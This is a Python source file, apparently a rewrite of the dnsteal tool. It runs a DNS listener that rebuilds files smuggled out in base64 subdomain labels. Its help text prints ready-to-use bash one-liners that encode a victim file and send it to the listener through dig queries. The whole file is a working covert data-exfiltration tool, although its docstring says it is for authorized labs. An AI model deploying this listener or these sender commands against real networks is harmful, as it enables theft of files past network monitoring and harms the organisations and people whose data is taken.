#!/usr/bin/env python3
"""
dnsteal_final_py3.py - DNS exfiltration listener for controlled labs

Python 3 rewrite inspired by m57/dnsteal.

Purpose:
    Receives DNS queries carrying base64-encoded file chunks in subdomain labels,
    reassembles them, optionally gunzips them, and writes the recovered files.

Default sender contract:
    <data1->.<data2->....<base64_filename>.<random>.zz

Data labels:
    - Carry base64 data chunks
    - End with '-'

Filename label:
    - The first label after the final data label
    - Base64-encoded filename

Example usage:
    sudo python3 dnsteal_final_py3.py 0.0.0.0
    sudo python3 dnsteal_final_py3.py 0.0.0.0 -z
    sudo python3 dnsteal_final_py3.py 0.0.0.0 -v

Notes:
    - Use -z only when the sender uses gzip.
    - Press Ctrl-C to flush received chunks to disk.
    - Intended for authorized educational/lab use only.
"""

import argparse
import base64
import gzip
import hashlib
import os
import socket
import sys
from collections import OrderedDict
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Tuple


VERSION = "3.0-final-py3"


class C:
    N = "\033[0m"
    R = "\033[1;31m"
    G = "\033[1;32m"
    Y = "\033[1;33m"
    B = "\033[1;34m"
    M = "\033[1;35m"
    Cy = "\033[1;36m"
    W = "\033[1;37m"


BANNER = f"""{C.G}
      ___  _  _ ___ _____ ___   _   _
     |   \\| \\| / __|_   _| __| /_\\ | |
     | |) | .` \\__ \\ | | | _| / _ \\| |__
     |___/|_|\\_|___/ |_| |___/_/ \\_\\____|
{C.N}
   -- DNS exfiltration listener, Python 3 final lab build v{VERSION}
"""


def b64_decode_padded(data: bytes) -> bytes:
    """Decode base64 bytes, adding missing padding if required."""
    return base64.b64decode(data + b"=" * (-len(data) % 4))


def b64_encode_no_newline(data: str) -> str:
    return base64.b64encode(data.encode()).decode().rstrip("=")


def parse_labels(packet: bytes) -> List[bytes]:
    """Return raw labels from the DNS question section."""
    if len(packet) < 13:
        return []

    i = 12
    labels: List[bytes] = []

    while i < len(packet):
        ln = packet[i]

        # End of QNAME
        if ln == 0:
            break

        # Compressed names should not normally appear in query QNAME.
        # Avoid trying to follow pointers in this simple listener.
        if ln & 0xC0:
            break

        i += 1
        if i + ln > len(packet):
            break

        labels.append(packet[i:i + ln])
        i += ln

    return labels


def build_noerror_response(query: bytes) -> bytes:
    """Minimal DNS NOERROR response with zero answers."""
    if len(query) < 12:
        return b""

    tid = query[:2]
    flags = b"\x81\x80"       # QR=1, RD=1, RA=1, RCODE=0
    qdcount = query[4:6]
    ancount = b"\x00\x00"
    nscount = b"\x00\x00"
    arcount = b"\x00\x00"

    return tid + flags + qdcount + ancount + nscount + arcount + query[12:]


def safe_filename(name: str, fallback: str) -> str:
    """Create a safer local filename while preserving readability."""
    name = name.strip().replace("\\", "_").replace("/", "_")
    name = name.replace("..", "_")
    name = "".join(ch if 32 <= ord(ch) < 127 else "_" for ch in name)
    name = name.strip(" .")

    if not name:
        name = fallback

    return name


def unique_path(directory: Path, filename: str) -> Path:
    """Avoid overwriting existing files."""
    candidate = directory / filename
    if not candidate.exists():
        return candidate

    stem = candidate.stem
    suffix = candidate.suffix

    for i in range(1, 10000):
        alt = directory / f"{stem}_{i}{suffix}"
        if not alt.exists():
            return alt

    timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    return directory / f"{stem}_{timestamp}{suffix}"


def decode_filename(label: bytes) -> Optional[str]:
    """Decode base64 filename label. Return None if invalid."""
    try:
        decoded = b64_decode_padded(label).decode("utf-8", "replace")
    except Exception:
        return None

    if not decoded:
        return None

    # Keep only sensible printable filenames.
    if not all((32 <= ord(ch) < 127) for ch in decoded):
        return None

    return decoded


def extract_payload(labels: List[bytes]) -> Tuple[Optional[str], List[bytes]]:
    """
    Extract filename and data chunks from DNS labels.

    Returns:
        filename, data_chunks

    Expected format:
        data-label-.data-label-.base64filename.random.zz
    """
    i = 0
    chunks: List[bytes] = []

    while i < len(labels) and labels[i].endswith(b"-"):
        chunks.append(labels[i].rstrip(b"-"))
        i += 1

    if not chunks:
        return None, []

    filename = None
    if i < len(labels):
        filename = decode_filename(labels[i])

    return filename, chunks


def save_received_files(files: Dict[str, List[bytes]], output_dir: Path, decompress: bool) -> None:
    if not files:
        print(f"{C.Y}[!] no data received{C.N}")
        return

    output_dir.mkdir(parents=True, exist_ok=True)

    print()
    for filename, chunks in files.items():
        fallback = f"received-{datetime.now():%Y%m%d-%H%M%S}.bin"
        clean_name = safe_filename(filename, fallback)
        out_path = unique_path(output_dir, clean_name)

        raw_b64 = b"".join(chunks).replace(b"*", b"+")

        print(f"{C.Y}[>] processing {filename!r}: {len(chunks)} chunk(s), {len(raw_b64)} base64 byte(s){C.N}")

        try:
            blob = b64_decode_padded(raw_b64)
        except Exception as e:
            print(f"{C.R}[!] base64 decode failed for {filename!r}: {e}{C.N}")
            continue

        if decompress:
            try:
                blob = gzip.decompress(blob)
            except Exception as e:
                print(f"{C.R}[!] gunzip failed for {filename!r}: {e}{C.N}")
                print(f"{C.Y}    Hint: use -z only if the sender used gzip -c.{C.N}")
                continue

        try:
            with open(out_path, "wb") as fh:
                fh.write(blob)
        except OSError as e:
            print(f"{C.R}[!] failed writing {out_path}: {e}{C.N}")
            continue

        md5 = hashlib.md5(blob).hexdigest()
        sha256 = hashlib.sha256(blob).hexdigest()

        print(f"{C.G}[+] wrote {len(blob)} bytes -> {out_path}{C.N}")
        print(f"{C.G}[md5]   {md5}{C.N}")
        print(f"{C.G}[sha256]{sha256}{C.N}\n")


def help_text(listen_ip: str, s: int, b: int) -> str:
    encoded_filename_example = "$(echo -ne \"$f\" | base64 -w0 | tr -d '=')"

    plain = (
        f"f=file.txt; s={s}; b={b}; c=0; "
        f"for r in $(for i in $(base64 -w0 \"$f\" | sed \"s/.\{{$b\}}/&\\n/g\"); "
        f"do if [[ \"$c\" -lt \"$s\" ]]; then echo -ne \"$i-.\"; c=$(($c+1)); "
        f"else echo -ne \"\\n$i-.\"; c=1; fi; done); "
        f"do dig +noidnin @{listen_ip} +short +retries=0 +tries=1 "
        f"\"$r{encoded_filename_example}.$RANDOM.zz\"; done"
    )

    zipped = (
        f"f=file.txt; s={s}; b={b}; c=0; "
        f"for r in $(for i in $(gzip -c \"$f\" | base64 -w0 | sed \"s/.\{{$b\}}/&\\n/g\"); "
        f"do if [[ \"$c\" -lt \"$s\" ]]; then echo -ne \"$i-.\"; c=$(($c+1)); "
        f"else echo -ne \"\\n$i-.\"; c=1; fi; done); "
        f"do dig +noidnin @{listen_ip} +short +retries=0 +tries=1 "
        f"\"$r{encoded_filename_example}.$RANDOM.zz\"; done"
    )

    return f"""
{C.W}Sender examples{C.N}

{C.G}# Plain file transfer. Listener: no -z{C.N}
{plain}

{C.G}# Gzipped file transfer. Listener: use -z{C.N}
{zipped}

{C.W}Options{C.N}
  -z        gunzip received data before writing
  -v        verbose: print received labels/chunks
  -s N      data subdomains per DNS query, default {s}
  -b N      bytes per data label, default {b}
  -f N      accepted for compatibility, default 17
  -o DIR    output directory, default current directory

{C.Y}Press Ctrl-C to flush received chunks to disk.{C.N}
"""


def main() -> None:
    parser = argparse.ArgumentParser(
        description="DNS exfiltration listener for authorized labs",
        add_help=True,
    )
    parser.add_argument("ip", help="IP address to bind, for example 0.0.0.0 or 192.168.1.10")
    parser.add_argument("-z", action="store_true", help="gunzip received data before writing")
    parser.add_argument("-v", action="store_true", help="verbose output")
    parser.add_argument("-s", type=int, default=4, help="data subdomains per request")
    parser.add_argument("-b", type=int, default=57, help="bytes per data label")
    parser.add_argument("-f", type=int, default=17, help="filename label length, compatibility option")
    parser.add_argument("-o", "--output-dir", default=".", help="directory to write recovered files")
    args = parser.parse_args()

    print(BANNER)
    print(help_text(args.ip, args.s, args.b))

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        sock.bind((args.ip, 53))
    except PermissionError:
        print(f"{C.R}[!] port 53 usually needs root. Try: sudo python3 {sys.argv[0]} {args.ip}{C.N}")
        sys.exit(1)
    except OSError as e:
        print(f"{C.R}[!] bind failed on {args.ip}:53/udp: {e}{C.N}")
        sys.exit(1)

    print(f"{C.G}[+] listening on {args.ip}:53/udp{C.N}")
    if args.z:
        print(f"{C.Y}[+] gzip mode enabled: received data will be gunzipped before writing{C.N}")
    print()

    # filename -> list of base64 data chunks
    received: Dict[str, List[bytes]] = OrderedDict()
    unnamed_counter = 0

    try:
        while True:
            packet, addr = sock.recvfrom(2048)

            response = build_noerror_response(packet)
            if response:
                try:
                    sock.sendto(response, addr)
                except OSError:
                    pass

            labels = parse_labels(packet)
            if not labels:
                continue

            filename, chunks = extract_payload(labels)

            if not chunks:
                if args.v:
                    pretty = b".".join(labels).decode("latin-1", "replace")
                    print(f"{C.Y}[?] ignored {addr[0]} -> {pretty}{C.N}")
                continue

            if filename is None:
                unnamed_counter += 1
                filename = f"received-{unnamed_counter}.bin"

            if filename not in received:
                received[filename] = []
                print(f"{C.Cy}[>] receiving file: {filename} from {addr[0]}{C.N}")

            received[filename].extend(chunks)

            print(f"{C.Y}[>] {addr[0]} -> {filename}: +{len(chunks)} chunk(s), total {len(received[filename])}{C.N}")

            if args.v:
                for chunk in chunks:
                    print(f"    {chunk.decode('latin-1', 'replace')}")

    except KeyboardInterrupt:
        print(f"\n{C.Y}[!] caught Ctrl-C, flushing received data...{C.N}")
        save_received_files(received, Path(args.output_dir), args.z)
    finally:
        sock.close()
        print(f"{C.R}[!] closed listener{C.N}")


if __name__ == "__main__":
    main()
